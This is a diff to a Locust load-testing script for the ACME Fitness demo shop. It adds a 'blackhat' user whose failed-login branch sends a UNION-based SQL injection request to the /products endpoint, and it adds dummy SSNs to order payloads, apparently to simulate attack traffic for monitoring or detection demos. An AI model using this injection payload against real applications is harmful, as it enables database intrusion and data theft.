@@ -8,7 +8,7 @@ import logging
 import jwt
 
 # List of users (pre-loaded into ACME Fitness shop)
-users = ["eric", "phoebe", "dwight", "han", "elaine", "walter"]
+users = ["eric", "phoebe", "dwight", "han", "elaine", "walter", "blackhat"]
 
 # GuestUserBrowsing simulates traffic for a Guest User (Not logged in)
 class UserBrowsing(SequentialTaskSet):
@@ -130,6 +130,11 @@ class AuthUserBrowsing(UserBrowsing):
             self.user.lastname = userdetails["lastname"]
             self.user.email = userdetails["email"]
             self.user.username = userdetails["username"]
+        else:
+            print("Initiating SQL Injection attack.")
+            response3 = self.client.get('/products?id=Holly"%20UNION%[...]20database(),2,3,4,5,6,7%20--+')
+            print(response3.json())
+
 
 
     @task(2)
@@ -176,9 +181,12 @@ class AuthUserBrowsing(UserBrowsing):
         ccmo = str(randint(1,12))
         ccyr = str(randint(2025,2035))
         ccv = str(randint(100,999))
+        ssn_choices = ["111-22-3333","444-55-6666","777-88-9999","333-66-7777","222-44-8888"]
+        r_ssn = random.choice(ssn_choices)
         This_Order_Info = { "userid":self.user.userid,
                 "firstname":self.user.firstname,
                 "lastname":self.user.lastname,
+                "ssn":r_ssn,
                 "address":{
                     "street":"20 Riding Lane Av",
                     "city":"San Francisco",
